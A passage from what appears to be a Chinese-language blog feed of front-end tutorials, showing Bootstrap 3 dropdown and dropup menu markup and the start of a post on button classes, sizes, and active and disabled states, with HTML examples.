class="hljs-name">button</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;btn btn-default btn-sm dropdown-toggle&quot;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;button&quot;</span> <span class="hljs-attr">data-toggle</span>=<span class="hljs-string">&quot;dropdown&quot;</span> <span class="hljs-attr">aria-haspopup</span>=<span class="hljs-string">&quot;true&quot;</span> <span class="hljs-attr">aria-expanded</span>=<span class="hljs-string">&quot;false&quot;</span>&gt;</span><br>    Small button <span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;caret&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">ul</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;dropdown-menu&quot;</span>&gt;</span><br>    ...<br>  <span class="hljs-tag">&lt;/<span class="hljs-name">ul</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><br><span class="hljs-comment">&lt;!-- Extra small button group --&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;btn-group&quot;</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;btn btn-default btn-xs dropdown-toggle&quot;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;button&quot;</span> <span class="hljs-attr">data-toggle</span>=<span class="hljs-string">&quot;dropdown&quot;</span> <span class="hljs-attr">aria-haspopup</span>=<span class="hljs-string">&quot;true&quot;</span> <span class="hljs-attr">aria-expanded</span>=<span class="hljs-string">&quot;false&quot;</span>&gt;</span><br>    Extra small button <span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;caret&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">ul</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;dropdown-menu&quot;</span>&gt;</span><br>    ...<br>  <span class="hljs-tag">&lt;/<span class="hljs-name">ul</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br></code></pre></div></td></tr></table></figure><h3 id="4-3-向上弹出式菜单"><a href="#4-3-向上弹出式菜单" class="headerlink" title="4.3 向上弹出式菜单"></a>4.3 向上弹出式菜单</h3><p>给父元素添加 <code>.dropup</code> 类就能使触发的下拉菜单朝上方打开。</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;row&quot;</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;margin-left:50px; margin-top:200px&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;btn-group dropup&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;button&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;btn btn-default dropdown-toggle&quot;</span> <span class="hljs-attr">data-toggle</span>=<span class="hljs-string">&quot;dropdown&quot;</span>&gt;</span>默认<br>            <span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;caret&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">ul</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;dropdown-menu&quot;</span> <span class="hljs-attr">role</span>=<span class="hljs-string">&quot;menu&quot;</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;#&quot;</span>&gt;</span>功能<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br>            <span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;#&quot;</span>&gt;</span>另一个功能<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br>            <span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;#&quot;</span>&gt;</span>其他<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br>            <span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">li</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;divider&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;#&quot;</span>&gt;</span>分离的链接<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br>            <span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">ul</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;btn-group dropup&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;button&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;btn btn-primary dropdown-toggle&quot;</span> <span class="hljs-attr">data-toggle</span>=<span class="hljs-string">&quot;dropdown&quot;</span>&gt;</span>原始<br>            <span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;caret&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">ul</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;dropdown-menu&quot;</span> <span class="hljs-attr">role</span>=<span class="hljs-string">&quot;menu&quot;</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;#&quot;</span>&gt;</span>功能<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br>            <span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;#&quot;</span>&gt;</span>另一个功能<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br>            <span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;#&quot;</span>&gt;</span>其他<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br>            <span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">li</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;divider&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;#&quot;</span>&gt;</span>分离的链接<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br>            <span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">ul</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br></code></pre></div></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>JavaWEB</category>
      
    </categories>
    
    
    <tags>
      
      <tag>JavaWEB</tag>
      
      <tag>BootStrap</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>JavaWEB-（十九）BootStrap-CSS全局样式(二)</title>
    <link href="/2021/08/18/JavaWEB/JavaWEB-%EF%BC%88%E5%8D%81%E4%B9%9D%EF%BC%89BootStrap-CSS%E5%85%A8%E5%B1%80%E6%A0%B7%E5%BC%8F(%E4%BA%8C)/"/>
    <url>/2021/08/18/JavaWEB/JavaWEB-%EF%BC%88%E5%8D%81%E4%B9%9D%EF%BC%89BootStrap-CSS%E5%85%A8%E5%B1%80%E6%A0%B7%E5%BC%8F(%E4%BA%8C)/</url>
    
    <content type="html"><![CDATA[<p>Bootstrap 是最受欢迎的 HTML、CSS 和 JS 框架，用于开发响应式布局、移动设备优先的 WEB 项目。Bootstrap是基于HTML、CSS、JavaScript 开发的简洁、直观、强悍的前端开发框架，使得 Web 开发更加快捷。提供了优雅的HTML和CSS规范。</p><h1 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h1><h2 id="1-按钮"><a href="#1-按钮" class="headerlink" title="1.按钮"></a>1.按钮</h2><p>为 <code>&lt;a&gt;</code>、<code>&lt;button&gt;</code> 或 <code>&lt;input&gt;</code> 元素添加按钮类（button class）即可使用 Bootstrap 提供的样式。</p><table><thead><tr><th align="left">类</th><th align="left">描述</th></tr></thead><tbody><tr><td align="left">.btn</td><td align="left">为按钮添加基本样式</td></tr><tr><td align="left">.btn-default</td><td align="left">默认/标准按钮</td></tr><tr><td align="left">.btn-primary</td><td align="left">原始按钮样式（未被操作）</td></tr><tr><td align="left">.btn-success</td><td align="left">表示成功的动作</td></tr><tr><td align="left">.btn-info</td><td align="left">该样式可用于要弹出信息的按钮</td></tr><tr><td align="left">.btn-warning</td><td align="left">表示需要谨慎操作的按钮</td></tr><tr><td align="left">.btn-danger</td><td align="left">表示一个危险动作的按钮操作</td></tr><tr><td align="left">.btn-link</td><td align="left">让按钮看起来像个链接 (仍然保留按钮行为)</td></tr><tr><td align="left">.btn-lg</td><td align="left">制作一个大按钮</td></tr><tr><td align="left">.btn-sm</td><td align="left">制作一个小按钮</td></tr><tr><td align="left">.btn-xs</td><td align="left">制作一个超小按钮</td></tr><tr><td align="left">.btn-block</td><td align="left">块级按钮(拉伸至父元素100%的宽度)</td></tr><tr><td align="left">.active</td><td align="left">按钮被点击</td></tr><tr><td align="left">.disabled</td><td align="left">禁用按钮</td></tr></tbody></table><p>示例：</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;button&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;btn btn-default&quot;</span>&gt;</span>（默认样式）Default<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;button&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;btn btn-primary&quot;</span>&gt;</span>（首选项）Primary<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;button&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;btn btn-success&quot;</span>&gt;</span>（成功）Success<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;button&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;btn btn-info&quot;</span>&gt;</span>（一般信息）Info<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;button&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;btn btn-warning&quot;</span>&gt;</span>（警告）Warning<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;button&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;btn btn-danger&quot;</span>&gt;</span>（危险）Danger<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;button&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;btn btn-link&quot;</span>&gt;</span>（链接）Link<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span><br></code></pre></div></td></tr></table></figure><h3 id="1-1-按钮大小"><a href="#1-1-按钮大小" class="headerlink" title="1.1 按钮大小"></a>1.1 按钮大小</h3><p>使用 <code>.btn-lg</code>、<code>.btn-sm</code> 或 <code>.btn-xs</code> 就可以获得不同尺寸的按钮。</p><p>下表列出了获得各种大小按钮的 class：</p><table><thead><tr><th align="left">Class</th><th align="left">描述</th></tr></thead><tbody><tr><td align="left">.btn-lg</td><td align="left">这会让按钮看起来比较大。</td></tr><tr><td align="left">.btn-sm</td><td align="left">这会让按钮看起来比较小。</td></tr><tr><td align="left">.btn-xs</td><td align="left">这会让按钮看起来特别小。</td></tr><tr><td align="left">.btn-block</td><td align="left">这会创建块级的按钮，会横跨父元素的全部宽度。</td></tr></tbody></table><p>示例：</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;button&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;btn btn-primary btn-lg&quot;</span>&gt;</span>大的原始按钮<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;button&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;btn btn-default btn-lg&quot;</span>&gt;</span>大的按钮<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;button&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;btn btn-primary&quot;</span>&gt;</span>默认大小的原始按钮<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;button&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;btn btn-default&quot;</span>&gt;</span>默认大小的按钮<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;button&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;btn btn-primary btn-sm&quot;</span>&gt;</span>小的原始按钮<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;button&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;btn btn-default btn-sm&quot;</span>&gt;</span>小的按钮<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;button&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;btn btn-primary btn-xs&quot;</span>&gt;</span>特别小的原始按钮<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;button&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;btn btn-default btn-xs&quot;</span>&gt;</span>特别小的按钮<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;button&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;btn btn-primary btn-lg btn-block&quot;</span>&gt;</span>块级的原始按钮<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;button&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;btn btn-default btn-lg btn-block&quot;</span>&gt;</span>块级的按钮<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br></code></pre></div></td></tr></table></figure><h3 id="1-2-激活状态"><a href="#1-2-激活状态" class="headerlink" title="1.2 激活状态"></a>1.2 激活状态</h3><p>当按钮处于激活状态时，其表现为被按压下去（底色更深、边框夜色更深、向内投射阴影）。对于 <code>&lt;button&gt;</code> 元素，是通过 <code>:active</code> 状态实现的。对于 <code>&lt;a&gt;</code> 元素，是通过 <code>.active</code> 类实现的。然而，你还可以将 <code>.active</code> 应用到 <code>&lt;button&gt;</code> 上（包含 <code>aria-pressed=&quot;true&quot;</code> 属性)），并通过编程的方式使其处于激活状态。</p><p>按钮元素（button标签）和锚元素（a标签）。</p><blockquote><ol><li>button元素</li></ol></blockquote><p>由于 <code>:active</code> 是伪状态，因此无需额外添加，但是在需要让其表现出同样外观的时候可以添加 <code>.active</code> 类。</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;button&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;btn btn-primary btn-lg active&quot;</span>&gt;</span>Primary button<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;button&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;btn btn-default btn-lg active&quot;</span>&gt;</span>Button<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span><br></code></pre></div></td></tr></table></figure><blockquote><ol start="2"><li>锚元素</li></ol></blockquote><p>可以为基于 <code>&lt;a&gt;</code> 元素创建的按钮添加 <code>.active</code> 类。</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;#&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;btn btn-primary btn-lg active&quot;</span> <span class="hljs-attr">role</span>=<span class="hljs-string">&quot;button&quot;</span>&gt;</span>Primary link<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;#&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;btn btn-default btn-lg active&quot;</span> <span class="hljs-attr">role</span>=<span class="hljs-string">&quot;button&quot;</span>&gt;</span>Link<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br></code></pre></div></td></tr></table></figure><h3 id="1-3-禁用状态"><a href="#1-3-禁用状态" class="headerlink" title="1.3 禁用状态"></a>1.3 禁用状态</h3><p>通过为按钮的背景设置 <code>opacity</code> 属性就可以呈现出无法点击的效果。</p><blockquote><ol><li>button元素</li></ol></blockquote><p>为 <code>&lt;button&gt;</code> 元素添加 <code>disabled</code> 属性，使其表现出禁用状态。</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;button&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;btn btn-lg btn-primary&quot;</span> <span class="hljs-attr">disabled</span>=<span class="hljs-string">&quot;disabled&quot;</span>&gt;</span>Primary button<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;button&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;btn btn-default btn-lg&quot;</span> <span class="hljs-attr">disabled</span>=<span class="hljs-string">&quot;disabled&quot;</span>&gt;</span>Button<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span><br></code></pre></div></td></tr></table></figure><blockquote><ol start="2"><li>锚元素</li></ol></blockquote><p>为基于 <code>&lt;a&gt;</code> 元素创建的按钮添加 <code>.disabled</code> 类。</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;#&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;btn btn-primary btn-lg disabled&quot;</span> <span class="hljs-attr">role</span>=<span class="hljs-string">&quot;button&quot;</span>&gt;</span>Primary link<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;#&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;btn btn-default btn-lg disabled&quot;</span> <span class="hljs-attr">role</span>=<span class="hljs-string">&quot;button&quot;</span>&gt;</span>Link<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br></code></pre></div></td></tr></table></figure><p>把 <code>.disabled</code> 作为工具类使用，就像 <code>.active</code> 类一样，因此不需要增加前缀。</p><p>综合示例：</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;button&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;btn btn-default btn-lg&quot;</span>&gt;</span>默认按钮<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;button&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;btn btn-default btn-lg&quot;</span> <span class="hljs-attr">disabled</span>=<span class="hljs-string">&quot;disabled&quot;</span>&gt;</span>禁用按钮<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;button&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;btn btn-primary btn-lg &quot;</span>&gt;</span>原始按钮<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;button&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;btn btn-primary btn-lg&quot;</span> <span class="hljs-attr">disabled</span>=<span class="hljs-string">&quot;disabled&quot;</span>&gt;</span>禁用的原始按钮<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;#&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;btn btn-default btn-lg&quot;</span> <span class="hljs-attr">role</span>=<span class="hljs-string">&quot;button&quot;</span>&gt;</span>链接<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;#&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;btn btn-default btn-lg 